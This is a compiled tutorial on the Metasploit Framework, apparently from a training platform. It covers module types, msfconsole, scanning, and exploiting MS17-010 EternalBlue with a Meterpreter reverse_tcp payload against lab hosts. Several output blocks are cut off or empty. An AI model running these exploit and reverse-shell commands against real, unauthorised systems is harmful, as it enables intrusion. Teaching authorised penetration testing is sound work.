# Introduction to Metasploit

Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

Metasploit has two main versions:

- **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version also has a GUI.
- **Metasploit Framework**: The open-source version that works from the command line. This room focuses on this version. 

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit framework focuses on the **penetration testing** domain, it is also useful for vulnerability research and exploit development.

The main components of the Metasploit framework can be summarized as follows:

- `msfconsole`: The main command-line interface.
- `Modules`: supporting modules such as exploits, scanners, payloads, etc.
- `Tools`: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are `msfvenom`, `pattern_create` and `pattern_offset`. We will cover `msfvemon` within this module, but `pattern_create` and `pattern_offset` are tools useful in **exploit development** which is beyond the scope of this room.

This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably.
# The Main Components of Metasploit

While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the `mfsconsole` command. The console will be your main interface to interact with the different modules of the Metasploit framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute force attack.

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit and payload.

- `Exploit`: A piece of code that uses a vulnerability present on the target system.
- `Vulnerability`: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
- `Payload`: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are *the code that will run on the target system*.

Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (`msfconsole`).
## Auxiliary

Any supporting module, such as scanners, crawlers, and fuzzers, can be found here.

## Encoders

**Encoders** will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. 

Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.

└── x86

```
## Evasion

While encoders will encode the payload, they should **not be considered** a direct attempt to evade antivirus software. On the other hand "evasion" modules will try that, with more or less success.

## NOPs

NOPs ((No OPeration)) do nothing, literally. They are represented in the Intel x86 CPU family with `0x90`, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

## Payloads

Payloads are code that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching `calc.exe` as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the `calc.exe` application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better.  Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.

```markup
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
```

You will see four different directories under payloads: adapters, singles, stagers and stages.

- `Adapters`: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be unwrapped inside a PowerShell adapter, which will make a single PowerShell command that will execute the payload. 
- `Singles`: Self-contained payloads (add user, launch notepad.exe) that doe not need to download an additional component to run.
- `Stagers`: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. "Staged Payloads" will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once. 
- `Stages`: Downloaded by the stager. This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called "inline") payloads and staged payloads.

- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the "`_`"  between "shell" and "reverse". While the later is a staged payload, as indicated by the "`/`" between "shell" and "reverse".
## Post

Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

```terminal

└── windows

12 directories, 0 files
```

If you wish to familiarize yourself further with these modules, you can find them under the modules folder of your Metasploit installation. For the AttackBox these are under /opt/metasploit-framework/embedded/framework/modules
# `msfconsole`

As previously mentioned, the console will be your main interface to the Metasploit framework. You can launch it using the `msfconsole` command on your AttackBox terminal or any system the Metasploit framework is installed on.

```shell-session
root@ip-10-10-220-191:~# msfconsole

Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search

msf6 >
```

Once launched, you will see the command line changes to `msf6` (or `ms5` depending on the installed version of Metasploit). The Metasploit console can be used just like a regular command line shell, as you can see below. The first command is `ls` which lists the contents of the folder from which Metasploit was launched using the `msfconsole` command. 

It is followed by a `ping` sent to Google's DNS IP address (8.8.8.8). As we operate from the attackbox, which is Linux, we add the `-c 1` option, so only a single ping was sent. Otherwise, the ping process would continue until it is stopped using `CTRL+C`.

```shell-session
msf6 > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms

rtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms
msf6 >
```

It will support most Linux commands, including `clear`, but will not allow you to use some features of a regular command line (output redirection, etc.) as seen below.

```shell-session
msf6 > help > help.txt
[-] No such command
msf6 >
```

While on the subject, the help command can be used on its own or for a specific command. Below is the help menu for the set command we will cover soon.

```shell-session
msf6 > help set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 >
```

You can use the `history` command to see commands you have typed earlier.

```shell-session
msf6 > history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
6  run
7  exit
8  exit -y
9  version
10  use exploit/multi/script/web_delivery
```

An important feature of `msfconsole` is the support of **tab completion**. This will come in handy later when using Metasploit command or dealing with modules. For example, if you start typing `he` and press the tab key, you will see it autocompletes to `help`.

`msfconsole` is managed by context; this means that unless set as a **global variable**, all parameter settings will be lost if you change the module you have decided to use. In the example below, we have used the `ms17_010_eternalblue` exploit, and we have set parameters such as `RHOSTS`. If we were to switch to another module (e.g. a port scanner), we would need to set the RHOSTS value again as all changes we have made remained in the context of the `ms17_010_eternalblue` exploit.

Let us look at the example below to have a better understanding of this feature. We will use the `MS17-010` "EternalBlue" exploit for illustration purposes.

Once you type the `use exploit/windows/smb/ms17_010_eternalblue` command, you will see the command line prompt change from `msf6` to `msf6 exploit(windows/smb/ms17_010_eternalblue`. The "EternalBlue" is an exploit developed by the NSA for a vulnerability affecting the SMBv1 server on numerous Windows systems. The `SMB` (**Server Message Block**) is widely used in Windows networks for file sharing and even for sending files to printers. EternalBlue was leaked by the cybercriminal group **Shadow Brokers** in April 2017. In May 2017, this vulnerability was exploited worldwide in the WannaCry ransomware attack. 

```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The module to be used can also be selected with the `use` command followed by the number at the beginning of the search result line.

While the prompt has changed, you will notice we can still run the commands previously mentioned. This means we did not "enter" a folder as you would typically expect in an operating system command line.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The prompt tells us we now have a context set in which we will work. You can see this by typing the show options command. 

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.220.191    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

This will print options related to the exploit we have chosen earlier. The show options command will have different outputs depending on the context it is used in. The example above shows that this exploit will require we set variables like `RHOSTS` and `RPORT`. On the other hand, a post-exploitation module may only need us to send a SESSION ID. A session is an *existing connection* to the target system that the post-exploitation module will use. 

```shell-session
msf6 post(windows/gather/enum_domain_users) > show options

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on.
   USER                      no        Target User for NetSessionEnum

msf6 post(windows/gather/enum_domain_users) >
```

The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules. The example below lists payloads that can be used with the `ms17-010 EternalBlue` exploit.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

If you use the `msfconsole` prompt, the `show` command will list all modules.  

The `use` and `show options` commands we have seen so far are identical for all modules in Metasploit.

You can leave the context using the `back` command. 

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > 
```

Further information on any module can be obtained by typing the `info` command within it's context.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

Alternatively, you can use the `info` command followed by the module's path from the `msfconsole` prompt (e.g. `info exploit/windows/smb/ms17_010_eternalblue`). Info is not a *help menu*, it will display detailed information on the module such as *author*, *relevant sources*, etc.
## Search

One of the most useful commands in `msfconsole` is `search`. This command will search the metasploit framework for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names, (eternalblue, heartbleed, etc.) or target system.

```shell-session
msf6 > search ms17-010

The output of `search` command provides an overview of each returned module. You may notice the "name" column already gives more information than just the module name. You can see the type of module (auxiliary, exploit) and the category of the module (scanner, admin, windows, Unix, etc). You can use any module returned in such a result with the command `use` followed by the **number at the beginning** of the result line (e.g `use 0` instead of `use auxiliary/admin/smb/ms17_010_command`)

Another essential piece of information returned is the "rank" column. Exploits are rated based on their reliability. The table below provides their respective descriptions.

You can direct the search function using keywords such as type and platform.

For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary. The screenshot below shows the output of the search type: auxiliary telnet command.

```shell-session

Please remember that exploits take advantage of a vulnerability on the target system and may always show unexpected behavior. A low-ranking exploit may work perfectly, and an excellent ranked exploit may not, or worse, crash the target system.
# Working with Modules

You can launch the target machine attached to this room to replicate the examples below. Any Metasploit version 5 or 6 will have menus and screens similar to those shown here so you can use the AttackBox or any OS installed locally. 

Once you have entered the context of a module using the `use` command followed by the module name, as seen earlier, you will need to set the parameters. The most common parameters you will use are listed below. Remember, based on the module you use, additional or different parameters may need to be set. It is good practice to use the `show options` command to list the required parameters. 

All parameters are set using the same command syntax:

```
set PARAMETER_NAME VALUE
```

Before we proceed, remember always to check the `msfconsole` prompt to ensure you are in the right context. When dealing with Metasploit, you may see five different prompts:

- **The regular command prompt**: You can no use Metasploit commands here. 

```shell-session
root@ip-10-10-XX-XX:~#
```

- **The `msfconsole` prompt**:  `msf6` (or msf5 depending on the installed version) is the `msfconsole` prompt. As you can see, no context is set here, so context-specific commands to set parameters and run modules can not be used here.

```shell-session
msf6 >
```

- **A context prompt**: Once you have decided to use a module and used the set command to choose it, the `msfconsole` will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

- **The meterpreter prompt**: Meterpreter is an important payload we will see in detail later in this module. This means a Meterpreter agent was loaded to the target system and connected back to you. You can use special meterpreter specific commands here. 

```shell-session
meterpreter >
```

- **A Shell on a target system**: Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system.

```shell-session
C:\Windows\system32>
```

```shell-session

As you can see in the screenshot above, some of these parameters require a value for the exploit to work. Some required parameter values will be pre-populated, make sure you check if these should remain the same for your target. 
	For example, a web exploit could have an RPORT (remote port: the port on the target system Metasploit will try to connect to and run the exploit) value preset to 80, but your target web application could be using port 8080.

In this example, we will set the RHOSTS parameter to the IP address of our target system using the `set` command.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39

Once you have set a parameter, you can use the `show options` command to check the value was set correctly. 

Parameters you will often use are:

- **RHOSTS**: "Remote Hosts", the IP address range of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-domain Routing) notation (/24, /16) or a network range (10.10.10.x - 10.10.10.y). You can also use a file where targets are listed, one target per line using `file:path/of/the/target_file.txt`, as you can see below.

![](https://i.imgur.com/9tFnOzk.png)

- **RPORT**: `Remote Port`, the port on the target system the vulnerable application is running on.
- **PAYLOAD**: The payload you will use with the exploit.
- **LHOST**: "`Localhost`", the attacking machine (your Kali or AttackBox) IP address.
- **LPORT**: "`Local port`", the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
- **SESSION**: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.

You can override any set parameter using the `set` command again with a **different value**. You can also clear any parameter value using the `unset` command or clear all set parameters with the `unset all` command.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all

You can use the `setg` command to set values that will be used for all modules. The `setg` command is used like the set command. The difference is that if you use the `set` command to set a value using a module and you switch to another module, you will need to set the value again. The `setg` command allows you to set the value so it can be used by default across different modules. You can clear any value set with `setg` using `unsetg`.

The example below uses the following flow:
1. We use the `ms17_010_eternalblue` exploitable.
2. We set the RHOSTS variable using the `setg` command instead of the set command
3. We use the `back` command to leave the exploit context
4. We use the auxiliary  (this module is a scanner to discover `MS17-010` vulnerabilities)
5. The `show options` command shows the RHOSTS parameter is already populated with the IP address of the target system.

The `setg` command sets a global value that will be used until you exit Metasploit or clear it using the `unsetg` command.
## Using Modules

Once all module parameters are set, you can launch the module using the `exploit` command. Metasploit also supports the `run` command, which is an alias created for the `exploit` command as the word exploit did not make sense when using modules that were not exploits (port scanners, vuln scanners, etc.)

The `exploit` command can be used without any parameters or using the `-z` parameter.
The `exploit -z` command will run the exploit and background the session as soon as it opens.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

This will return you the context prompt from which you have run the exploit. Some modules support the `check` option. This will check if the target system is vulnerable without exploiting it.
## Sessions

Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.

You can use the `background` command to background the session prompt and go back to the `msfconsole` prompt. 

```shell-session
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Alternatively, `CTRL+Z` can be used to background sessions.
The `sessions` command can be used from the `msfconsole` prompt or any context to see the existing sessions.

# Summary

As we have seen so far, Metasploit is a powerful tool that facilitates the exploitation process. The exploitation process comprises three main steps; finding the exploit, customizing the exploit, and exploiting the vulnerable service.

Metasploit provides many modules that you can use for each step of the exploitation process. Through this room, we have seen the basic components of Metasploit and their respective use.

It would be best if you also had used the ms17_010_eternalblue exploit to gain access to the target VM.  

In the following rooms, we will cover Metasploit and its components in more detail. Once completed, this module should give you a good understanding of the capabilities of Metasploit.
# Metasploit: Exploitation

In this room, we will learn how to use Metasploit for vulnerability scanning and exploitation. We will also cover how the database feature makes it easier to manage penetration testing engagements with a broader scope. Finally, we will look at generating payloads with `msfvenom` and how to start a Meterpreter session on most target platforms.

More specifically, the topics we will cover are:

- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

Please note that for all questions that require using a wordlist (e.g brute-force attacks), we will be using the wordlist on the AttackBox found at the following path:

`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt` 

If you opt to use your own machine, please download the wordlist by clicking the Download Task Files button to the right.

Start the AttackBox and run Metasploit using the `msfconsole` command to follow along with this room.
# Scanning 

## Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the `search portscan` command. 

```shell-session
msf6 > search portscan

Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf6 >
```

Port scanning modules will require you to set a few options:

```shell-session
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >
```

- **Concurrency**: Number of targets to be scanned simultaneously.
- **PORTS**: Port range to be scanned. Please note that 1-1000 here will not be the same thing as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 1000.
- **RHOSTS**: Target or target network to be scanned.
- **THREADS**: Number of threads that will be used simultaneously. More threads will result in faster scans. 

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```shell-session
msf6 > nmap -sS 10.10.12.229
[*] exec: nmap -sS 10.10.12.229

```

As for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.
## UDP Service Identification

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over UDP. As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```shell-session
msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.12.229->10.10.12.229 (1 hosts)
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) >
```
## SMB Scans

Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a *corporate network* would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```shell-session
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

When performing service scans, it would be important to not omit "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about it's role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.) You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.)

Remember, Metasploit has many modules that can help you get a better understanding of your target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system.
# The Metasploit Database

While it is not required when interacting with a single target on TryHackMe, an actual pentest will likely have *several targets*.

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

You will first need to start the PostgreSQL database, which metasploit will use with the following command.

```
systemctl start postgresql
```

Then you will need to initialize the Metasploit Database using the `msfdb init` command.

```shell-session
root@attackbox:~# systemctl start postgresql 
root@attackbox:~# msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
```

You can now launch `msfconsole` and check the database status using the `db_status` command.

```shell-session
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 >
```

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.

```shell-session
msf6 > workspace
* default
msf6 >
```

You can add a workspace using the `-a` parameter or delete a workspace using the `-d` parameter, respectively. The screenshot below shows that a new workspace named "tryhackme" was created. 

```shell-session
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```

You will also notice that the new database name is printed in red, starting with a `*` symbol. You can use the workspace command to navigate between workspaces simply by typing `workspace` followed by the desired workspace name.

```shell-session
msf6 > workspace
default
* tryhackme
msf5 > workspace default
[*] Workspace: default
msf5 > workspace 
tryhackme
* default
msf6 >
```

You can use the `workspace -h` command to list available options for the `workspace` command.

```shell-session
msf6 > workspace -h
Usage:
workspace                  List workspaces
workspace -v               List workspaces verbosely
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r     Rename workspace
workspace -h               Show this help information
```

Different from regular metasploit usage, once Metasploit is launched with a database, the `help` command, you will show the database backends command menu.

```shell-session

```

If you run a Nmap scan using the `db_map` shown below, all results will be saved to the database.

```shell-session
msf6 > db_nmap -sV -p- 10.10.12.229
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-20 03:15 UTC

You can now reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands, respectively.

```shell-session
msf6 > hosts

The `hosts -h` and `services -h` commands can help you become more familiar with available options.

Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter.
## Example Workflow:

1. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
2. We set the RHOSTS value using `hosts -R`.
3. We have typed `show options` to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the `db_nmap` command).
4. Once all parameters are set, we launch the exploit using the `run` or `exploit` command.

```shell-session

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

If there is more than one host saved to the database, all IP addresses will be used when the `hosts -R` command is used. In a typical penetration testing engagement, we could have the following scenario:

- Finding available hosts using the `db_nmap` command.
- Scanning these for further vulnerabilities or open ports (using a port scanning module)

The services command used with the `-S` parameter will allow you to search for specific services in the environment.

```shell-session

You may want to look for low-hanging fruits such as:

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL Injection or Remote Code Execution (RCE).
- FTP: Could allow anonymous login and provide access to interesting files.
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials.
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

As you can see, Metasploit has many features to aid in engagements such as the ability to compartmentalize your engagements into workspaces, analyze your results at a high level, and quickly import and explore data.
# Vulnerability Scanning

Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as "low hanging fruit". The term **low hanging fruit** usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as `root` or `administrator`.

Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you. 
	For example, if you identify a VNC service running on a target, you may use the `search` function on Metasploit to list useful modules. The results will contain payload and post modules. At this stage, these results are not very useful as we have not discovered a potential exploit to use just yet. However, in the case of VNC, there are several scanner modules that we can use.

```shell-session
msf6 > use auxiliary/scanner/vnc/
use auxiliary/scanner/vnc/ard_root_pw    use auxiliary/scanner/vnc/vnc_login      use auxiliary/scanner/vnc/vnc_none_auth
msf6 > use auxiliary/scanner/vnc/
```

You can use the `info` command for any module to have a better understanding of its use and purpose.

```shell-session
msf6 auxiliary(scanner/vnc/vnc_login) > info

Description:
  This module will test a VNC server on a range of machines and report 
  successful logins. Currently it supports RFB protocol version 3.3, 
  3.7, 3.8 and 4.001 using the VNC challenge response authentication 
  method.
